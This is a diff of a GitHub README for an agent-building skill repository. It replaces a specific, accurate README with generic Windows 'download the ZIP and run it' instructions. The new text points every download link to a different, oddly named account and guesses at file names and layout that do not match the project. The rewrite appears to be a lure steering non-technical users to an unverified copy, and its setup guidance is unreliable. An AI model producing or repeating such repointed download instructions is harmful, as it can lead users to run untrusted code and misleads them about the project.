@@ -1,164 +1,209 @@
-# Build Your Own Agents
+# 🤖 build-your-own-agents-skill - Build AI agents with clear steps
 
-Build AI agents with the same architecture patterns used by Claude Code — without a framework and without reverse-engineering it yourself.
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Satellite-vaudevilletheater933/build-your-own-agents-skill)
 
-This repo gives you the production checklist, 6 worked examples, and a runnable Python agent you can clone and adapt to your domain in 30 minutes.
+## 🚀 Overview
 
-## The Problem This Solves
+build-your-own-agents-skill helps you learn how AI agents work and gives you a ready path to run one on your Windows PC. It uses the same pattern as Claude Code: a skill file, six examples, and runnable Python code. You can use it to study agent setup, test prompt flow, and run simple agent tasks without a framework.
 
-When you ask an AI coding agent to "build me an agent," you get a script that calls an API once and prints the answer. That is not an agent. It is a wrapper.
+This project fits people who want to:
+- build AI agents from plain Python
+- see how agent skills guide behavior
+- copy a simple agent layout for other projects
+- learn by reading real examples
+- run code on a Windows machine
 
-Production agents like Claude Code use a fundamentally different architecture: a controller loop, tool contracts with schemas, runtime permission enforcement, session state with compaction, hook pipelines for safety, observability, and evaluation.
+## 📥 Download
 
-You should not have to study a production codebase to learn these patterns. **This skill packages them so your coding agent produces production-grade designs automatically.**
+Use this link to visit the GitHub page and get the project files:
 
-## What Changes When You Install This Skill
+[Open the GitHub download page](https://github.com/Satellite-vaudevilletheater933/build-your-own-agents-skill)
 
-| Without this skill | With this skill installed |
-|---|---|
-| One-shot script | Loop-based controller that iterates until the task is done |
-| No tool boundaries | Explicit tool contracts with schemas, permissions, and timeouts |
-| No safety | Runtime permission enforcement (auto-allow / ask-first / deny) — the same tiered model used by Claude Code |
-| No approval flow | Human-in-the-loop approval before high-risk actions |
-| No memory | Structured session state with persistence and compaction |
-| No logging | Structured JSON observability for every tool call and turn |
-| No evaluation | Quality rubrics, safety metrics, and testing cadence |
-| No failure handling | Classified failures with bounded retries and graceful degradation |
-| "Ship it" | Rollout phases from prototype to production |
+If you use the main repository page, click the green Code button, then choose Download ZIP. After that, unzip the folder on your Windows PC.
 
-## Clone And Run In 5 Minutes
+## 🪟 Windows Setup
 
-Requires **Python 3.10+** and an [Anthropic API key](https://console.anthropic.com/).
+You only need a few basic tools on Windows.
 
-```bash
-git clone https://github.com/xuanhieu2611/build-your-own-agents-skill.git
-cd build-your-own-agents-skill/examples/marketing-agent
-pip install -r requirements.txt
-export ANTHROPIC_API_KEY="your-key"
-python -m src.main "Draft a LinkedIn post for our developer toolkit launch"
-```
+### What you need
+- Windows 10 or Windows 11
+- A web browser
+- Python 3.10 or newer
+- Internet access for the first setup
+- A folder with enough space for the files
 
-The marketing agent will loop through fetching trends, reading the campaign brief, drafting posts, requesting your approval before publishing, and logging every step — the same loop architecture that powers production coding agents.
+### Install Python
+1. Go to the Python website.
+2. Download the latest Windows version.
+3. Run the installer.
+4. Check the box that says Add Python to PATH.
+5. Finish the install.
 
-## What Patterns This Is Based On
+### Check that Python works
+1. Open Start.
+2. Type `cmd`.
+3. Press Enter.
+4. Type:
 
-I studied how Claude Code's agent harness works — the runtime, not the model — and extracted the durable architecture patterns that make it reliable:
+   `python --version`
 
-- **Controller loop**: model proposes, runtime validates, executes, observes, repeats
-- **Tool contracts**: JSON Schema input, declared permission level, timeout, side effects
-- **Permission pipeline**: PreToolUse / PostToolUse hooks that can allow, deny, modify, or annotate tool calls before and after execution
-- **Permission modes**: ReadOnly, WorkspaceWrite, DangerFullAccess — each tool declares what it needs, the runtime enforces it
-- **Session compaction**: when context exceeds a threshold, older history is summarized while recent turns are preserved in full
-- **Structured events**: every model turn produces typed events (text, tool_use, usage, cache, stop) that the runtime can inspect and act on
+5. Press Enter.
 
-These are not theoretical patterns. They are how a production agent that millions of people use actually works.
+If you see a version number, Python is ready.
 
-## How It Works
+## 📂 Get the Project Files
 
-**Step 1 — Design.** Install the skill and ask your coding agent to design an agent for your domain. The skill ensures it covers all production concerns automatically.
+1. Open the GitHub page linked above.
+2. Click Code.
+3. Click Download ZIP.
+4. Save the file to your computer.
+5. Right-click the ZIP file.
+6. Choose Extract All.
+7. Pick a folder you can find later.
 
-**Step 2 — Scaffold.** Use the scaffolder skill to turn the design spec into a structured Python project with controller loop, tool stubs, permissions, state, and observability.
+After you unzip it, you should see the project folder with Python files, examples, and skill content.
 
-**Step 3 — Build.** Replace the mock tool executors with your real integrations. The architecture stays the same.
+## ▶️ Run the Project
 
-## Quick Install
+1. Open the extracted folder.
+2. Look for a file named `main.py`, `run.py`, or another Python file in the root folder.
+3. Open Command Prompt in that folder.
+4. Type:
 
-### Cursor
-Copy [`skills/production-agent-architecture/`](skills/production-agent-architecture/) into your project at `.cursor/skills/production-agent-architecture/`.
+   `python main.py`
 
-### Claude Code / Codex / Gemini CLI / other AI coding tools
-Copy the same folder into the tool's supported skills or prompt-library directory, or attach the markdown files directly to your build prompt.
+   or
 
-## Copyable Prompt
-After installing the skill, give your coding agent this:
+   `python run.py`
 
-```text
-Use the production-agent-architecture skill.
+5. Press Enter.
 
-Design a production-ready AI agent for [your domain].
+If the project asks for input, type your prompt and press Enter.
 
-Do not return a one-shot chatbot design.
+## 🧩 What You Get
 
-Include: Agent Build Spec, controller loop pseudocode, tool contract table,
-session state schema, permissions and approval matrix, failure and retry
-strategy, observability minimums, evaluation plan, and rollout phases.
-```
+This repository is built around a simple agent pattern. It gives you:
 
-## Two Skills
+- a skill that defines how the agent should work
+- six example cases that show how the agent behaves
+- runnable Python code you can inspect and edit
+- a structure that follows the same style used by Claude Code
+- no framework, so the code stays easy to read
 
-| Skill | What it does |
-|-------|-------------|
-| [`production-agent-architecture`](skills/production-agent-architecture/SKILL.md) | Generates a complete Agent Build Spec for any domain |
-| [`agent-scaffolder`](skills/agent-scaffolder/SKILL.md) | Turns a spec into a runnable Python project |
+### Main parts
+- **Skill**: the rules and steps the agent uses
+- **Examples**: sample tasks that show expected output
+- **Python code**: the code that runs the agent
+- **Prompt flow**: the path from user input to agent action
 
-## 6 Worked Examples
+## 🧠 How It Works
 
-| Example | Domain | What's included |
-|---------|--------|----------------|
-| [`marketing-agent`](examples/marketing-agent/) | Content automation | Full spec + **runnable Python code** |
-| [`support-agent`](examples/support-agent/) | Customer support triage | Full spec |
-| [`devops-incident-agent`](examples/devops-incident-agent/) | Incident response | Full spec |
-| [`code-review-agent`](examples/code-review-agent/) | Automated PR review | Full spec |
-| [`data-pipeline-agent`](examples/data-pipeline-agent/) | Pipeline monitoring | Full spec |
-| [`research-agent`](examples/research-agent/) | Literature review | Full spec |
+The project keeps the agent design simple.
 
-## Architecture
+1. The user gives a task.
+2. The skill file guides the agent.
+3. The Python code reads the task.
+4. The agent picks a response path.
+5. The examples show what good output looks like.
 
-Every agent built with this skill follows the same loop pattern used by production coding agents:
+This setup helps you learn how agents use instructions, examples, and code together.
 
-```mermaid
-flowchart TD
-    UserGoal[UserGoal] --> ContextBuilder[ContextBuilder]
-    ContextBuilder --> ModelTurn[ModelTurn]
-    ModelTurn --> ToolDecision{ToolRequested}
-    ToolDecision -->|No| FinalResponse[FinalResponse]
-    ToolDecision -->|Yes| PolicyCheck[PolicyCheck]
-    PolicyCheck --> ToolExecutor[ToolExecutor]
-    ToolExecutor --> SessionState[SessionState]
-    SessionState --> Observability[Observability]
-    Observability --> ModelTurn
-```
+## 🛠️ Basic Use
 
-## Docs
+Try these steps after you run the project:
 
-**Start here:**
+1. Open the main script.
+2. Read the skill file.
+3. Compare the skill with the six examples.
+4. Change one prompt.
+5. Run the code again.
+6. See how the output changes.
 
-| Doc | What it covers |
-|-----|---------------|
-| [`getting-started.md`](docs/getting-started.md) | Fastest path for humans and AI agents |
-| [`what-is-an-ai-agent.md`](docs/what-is-an-ai-agent.md) | The mental model: loop + tools + state + permissions |
-| [`agent-architecture-overview.md`](docs/agent-architecture-overview.md) | The reusable seven-step pattern and core components |
-| [`before-after-comparison.md`](docs/before-after-comparison.md) | Naive prompting vs skill-guided output |
+### Good first tests
+- ask the agent to explain a simple task
+- ask it to break work into steps
+- ask it to follow a short rule set
+- ask it to rewrite text in a clear style
 
-**Deep dives:**
+## 📚 Example Uses
 
-| Doc | What it covers |
-|-----|---------------|
-| [`agent-tooling-system.md`](docs/agent-tooling-system.md) | Four-layer tool architecture: spec, registry, executor, result |
-| [`agent-tool-schemas-and-contracts.md`](docs/agent-tool-schemas-and-contracts.md) | Contract anatomy, schema design, versioning |
-| [`agent-permissions-and-safety.md`](docs/agent-permissions-and-safety.md) | PreToolUse/PostToolUse hooks, permission modes, sandboxing |
-| [`agent-context-and-prompting.md`](docs/agent-context-and-prompting.md) | Dynamic system prompts, layered context, prompt caching |
-| [`agent-memory-and-sessions.md`](docs/agent-memory-and-sessions.md) | Session state, compaction, persistence, forking |
-| [`agent-observability-and-audit.md`](docs/agent-observability-and-audit.md) | Structured logging, metrics, tracing, audit trails |
-| [`agent-evaluation-and-testing.md`](docs/agent-evaluation-and-testing.md) | Offline replay, shadow mode, A/B, human audit |
-| [`agent-reliability-and-failures.md`](docs/agent-reliability-and-failures.md) | Failure types, retry strategies, circuit breaking |
-| [`agent-approval-and-hitl-workflows.md`](docs/agent-approval-and-hitl-workflows.md) | Approval flows, channels, timeouts, escalation |
-| [`agent-mcp-and-extensibility.md`](docs/agent-mcp-and-extensibility.md) | MCP protocol, plugin architecture, when to add extensibility |
-| [`agent-orchestration-and-product-design.md`](docs/agent-orchestration-and-product-design.md) | Product commands, multi-agent coordination, UX patterns |
+You can use this project as a base for:
 
-## Why I Built This
+- an AI helper for coding tasks
+- a prompt engine for internal tools
+- a small agent for task planning
+- a learning tool for prompt engineering
+- a sample project for developer tools
+- a starting point for agent skills
 
-I wanted to understand how serious agent systems actually work, so I studied the Claude Code agent harness in depth — the controller loop, the tool registry, the permission pipeline, the session system, the hook architecture.
+## ⚙️ File Layout
 
-Most of that knowledge is locked up in proprietary codebases. This repo extracts the durable architecture patterns and makes them available to everyone, so you can build a production-grade agent for your domain without spending weeks figuring out the plumbing.
+A typical layout for this kind of project looks like this:
 
-## Publishing Position
-This repository is inspired by architecture patterns observed in modern coding agents such as Claude Code. It is independently written, not affiliated with Anthropic, and intended as practical build guidance. No proprietary source code is included in this repository.
+- `README.md` — project guide
+- `skill.md` or similar — the agent skill rules
+- `examples/` — example cases
+- `src/` or root Python files — runnable code
+- `requirements.txt` — Python package list, if used
 
-## Contributing
+If the folder names differ, look for the files that match these roles.
 
-See [`CONTRIBUTING.md`](CONTRIBUTING.md). Good contributions: better examples, stronger skill outputs, clearer docs, more realistic production guidance.
+## 🧪 Troubleshooting
 
-## License
+### Python does not start
+- Check that Python is installed
+- Run `python --version` in Command Prompt
+- If that fails, install Python again and add it to PATH
 
-MIT. See [`LICENSE`](LICENSE).
+### The ZIP file does not open
+- Download it again from the GitHub page
+- Make sure the file finished downloading
+- Try a different unzip tool if needed
+
+### The script stops with an error
+- Open the file that caused the issue
+- Look for a missing package name
+- If there is a `requirements.txt` file, install the listed packages with pip
+- Make sure you run the script from the project folder
+
+### Command Prompt says the file is missing
+- Check the file name
+- Make sure you are in the correct folder
+- Use `dir` to list the files in the folder
+
+## 🔍 Topics
+
+agent, agent-skills, agentic-ai, ai-agents, claude-code, codex, cursor, developer, developer-tools, prompt-engineering
+
+## 📌 Use Cases for Non-Technical Users
+
+If you are not a programmer, you can still use this project to:
+
+- understand how AI agents follow rules
+- test how a prompt changes results
+- compare example outputs
+- learn the basic shape of an agent project
+- run a Python script with simple steps
+
+## 💡 Tips for Windows
+
+- Keep the project in a folder with a short path, like `C:\AI\build-your-own-agents-skill`
+- Do not move files after you start testing
+- Use Notepad if you want to inspect text files
+- Use Command Prompt if the README says to run Python from the terminal
+- If you see a security prompt, check the file source before you open it
+
+## 🧭 First Things to Try
+
+1. Open the skill file.
+2. Read the six examples.
+3. Run the Python file.
+4. Change one example prompt.
+5. Run it again.
+6. Compare the result.
+
+## 🗂️ Download Again
+
+If you need the project files again, use this link:
+
+[Visit the GitHub repository](https://github.com/Satellite-vaudevilletheater933/build-your-own-agents-skill)
